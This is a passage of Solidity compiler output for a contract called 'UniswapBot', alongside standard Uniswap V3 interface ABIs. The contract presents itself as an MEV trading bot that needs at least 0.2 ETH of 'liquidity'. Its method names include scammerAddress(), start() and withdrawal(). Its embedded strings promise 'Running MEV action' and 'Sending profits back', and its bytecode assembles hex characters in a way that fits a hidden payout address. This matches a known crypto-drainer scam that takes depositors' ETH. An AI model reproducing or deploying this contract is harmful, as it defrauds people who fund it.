											"end": 17330,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 17299,
											"end": 17330,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17279,
											"end": 17282,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17248,
											"end": 17342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 17248,
											"end": 17342,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 17248,
											"end": 17342,
											"name": "tag",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 17248,
											"end": 17342,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17368,
											"end": 17377,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "SWAP7",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17354,
											"end": 17378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16756,
											"end": 17386,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 16756,
											"end": 17386,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16756,
											"end": 17386,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16756,
											"end": 17386,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16756,
											"end": 17386,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 12958,
											"end": 13046,
											"name": "tag",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 12958,
											"end": 13046,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13009,
											"end": 13013,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13033,
											"end": 13038,
											"name": "PUSH",
											"source": 0,
											"value": "F06A"
										},
										{
											"begin": 13026,
											"end": 13038,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13026,
											"end": 13038,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12958,
											"end": 13046,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12958,
											"end": 13046,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 16365,
											"end": 16453,
											"name": "tag",
											"source": 0,
											"value": "62"
										},
										{
											"begin": 16365,
											"end": 16453,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16415,
											"end": 16419,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16439,
											"end": 16445,
											"name": "PUSH",
											"source": 0,
											"value": "60F9E"
										},
										{
											"begin": 16432,
											"end": 16445,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16432,
											"end": 16445,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16365,
											"end": 16453,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16365,
											"end": 16453,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "tag",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14642,
											"end": 14646,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14668,
											"end": 14669,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14669,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14663,
											"end": 14669,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14664,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14663,
											"end": 14669,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14669,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14678,
											"end": 14679,
											"name": "PUSH",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 14673,
											"end": 14674,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14673,
											"end": 14679,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14673,
											"end": 14679,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14673,
											"end": 14679,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14673,
											"end": 14679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "tag",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 14663,
											"end": 14679,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14659,
											"end": 14850,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14659,
											"end": 14850,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 14659,
											"end": 14850,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14727,
											"end": 14728,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14714,
											"end": 14723,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14708,
											"end": 14724,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14708,
											"end": 14724,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 14708,
											"end": 14728,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14703,
											"end": 14729,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14703,
											"end": 14729,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 14696,
											"end": 14729,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14696,
											"end": 14729,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14696,
											"end": 14729,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 14696,
											"end": 14729,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 14659,
											"end": 14850,
											"name": "tag",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 14659,
											"end": 14850,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14763,
											"end": 14764,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14765,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14751,
											"end": 14765,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14753,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 14751,
											"end": 14765,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14765,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14781,
											"end": 14783,
											"name": "PUSH",
											"source": 0,
											"value": "F"
										},
										{
											"begin": 14775,
											"end": 14776,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14769,
											"end": 14783,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14769,
											"end": 14783,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14769,
											"end": 14783,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14769,
											"end": 14783,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "tag",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 14751,
											"end": 14783,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14747,
											"end": 14850,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14747,
											"end": 14850,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "137"
										},
										{
											"begin": 14747,
											"end": 14850,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14835,
											"end": 14837,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 14831,
											"end": 14832,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14818,
											"end": 14827,
											"name": "PUSH",
											"source": 0,
											"value": "6100000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14812,
											"end": 14828,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14812,
											"end": 14828,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 14812,
											"end": 14832,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14812,
											"end": 14837,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14807,
											"end": 14838,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14807,
											"end": 14838,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 14800,
											"end": 14838,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14800,
											"end": 14838,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14800,
											"end": 14838,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 14800,
											"end": 14838,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 14747,
											"end": 14850,
											"name": "tag",
											"source": 0,
											"value": "137"
										},
										{
											"begin": 14747,
											"end": 14850,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "tag",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14590,
											"end": 14917,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
										"9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e"
									}
								}
							}
						},
						"methodIdentifiers": {
							"scammerAddress()": "ab1c067d",
							"start()": "be9a6555",
							"tokenName()": "6c02a931",
							"tokenSymbol()": "7b61c320",
							"withdrawal()": "d4e93292"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"scammerAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{},\"notice\":\"Testnet transactions will fail as there is no value Updated Build Min liquidity after gas fees has to equal 0.2 ETH\"}},\"settings\":{\"compilationTarget\":{\"contracts/bot.sol\":\"UniswapBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/bot.sol\":{\"keccak256\":\"0x002e48073b97bda8a43675f8e68911f1186e482947a596e2f60ae2f07dc5ff5b\",\"urls\":[\"bzz-raw://111b3a0848014edcf3166f90b4fd70b852735c462f77c82c88a2007a5352304a\",\"dweb:/ipfs/QmW5vcwmbroitEaeXX3xyh3fX3sw2dRNjJpAJn55vLFABQ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contracts/bot.sol:UniswapBot",
								"label": "tokenName",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 9,
								"contract": "contracts/bot.sol:UniswapBot",
								"label": "tokenSymbol",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 11,
								"contract": "contracts/bot.sol:UniswapBot",
								"label": "liquidity",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {},
						"notice": "Testnet transactions will fail as there is no value Updated Build Min liquidity after gas fees has to equal 0.2 ETH"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"IUniswapV3Factory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "FeeAmountEnabled",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "oldOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnerChanged",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"name": "PoolCreated",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "createPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "enableFeeAmount",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "feeAmountTickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "getPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "setOwner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"createPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.",
								"params": {
									"fee": "The desired fee for the pool",
									"tokenA": "One of the two tokens in the desired pool",
									"tokenB": "The other of the two tokens in the desired pool"
								},
								"returns": {
									"pool": "The address of the newly created pool"
								}
							},
							"enableFeeAmount(uint24,int24)": {
								"details": "Fee amounts may never be removed once enabled",
								"params": {
									"fee": "The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)",
									"tickSpacing": "The spacing between ticks to be enforced for all pools created with the given fee amount"
								}
							},
							"feeAmountTickSpacing(uint24)": {
								"details": "A fee amount can never be removed, so this value should be hard coded or cached in the calling context",
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee"
								},
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"getPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either token0/token1 or token1/token0 order",
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"tokenA": "The contract address of either token0 or token1",
									"tokenB": "The contract address of the other token"
								},
								"returns": {
									"pool": "The pool address"
								}
							},
							"owner()": {
								"details": "Can be changed by the current owner via setOwner",
								"returns": {
									"_0": "The address of the factory owner"
								}
							},
							"setOwner(address)": {
								"details": "Must be called by the current owner",
								"params": {
									"_owner": "The new owner of the factory"
								}
							}
						},
						"title": "The interface for the Uniswap V3 Factory"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"createPool(address,address,uint24)": "a1671295",
							"enableFeeAmount(uint24,int24)": "8a7c195f",
							"feeAmountTickSpacing(uint24)": "22afcccb",
							"getPool(address,address,uint24)": "1698ee82",
							"owner()": "8da5cb5b",
							"setOwner(address)": "13af4035"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"FeeAmountEnabled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"name\":\"PoolCreated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"createPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"enableFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"feeAmountTickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"getPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"createPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.\",\"params\":{\"fee\":\"The desired fee for the pool\",\"tokenA\":\"One of the two tokens in the desired pool\",\"tokenB\":\"The other of the two tokens in the desired pool\"},\"returns\":{\"pool\":\"The address of the newly created pool\"}},\"enableFeeAmount(uint24,int24)\":{\"details\":\"Fee amounts may never be removed once enabled\",\"params\":{\"fee\":\"The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\",\"tickSpacing\":\"The spacing between ticks to be enforced for all pools created with the given fee amount\"}},\"feeAmountTickSpacing(uint24)\":{\"details\":\"A fee amount can never be removed, so this value should be hard coded or cached in the calling context\",\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\"},\"returns\":{\"_0\":\"The tick spacing\"}},\"getPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\",\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"tokenA\":\"The contract address of either token0 or token1\",\"tokenB\":\"The contract address of the other token\"},\"returns\":{\"pool\":\"The pool address\"}},\"owner()\":{\"details\":\"Can be changed by the current owner via setOwner\",\"returns\":{\"_0\":\"The address of the factory owner\"}},\"setOwner(address)\":{\"details\":\"Must be called by the current owner\",\"params\":{\"_owner\":\"The new owner of the factory\"}}},\"title\":\"The interface for the Uniswap V3 Factory\"},\"userdoc\":{\"methods\":{\"createPool(address,address,uint24)\":{\"notice\":\"Creates a pool for the given two tokens and fee\"},\"enableFeeAmount(uint24,int24)\":{\"notice\":\"Enables a fee amount with the given 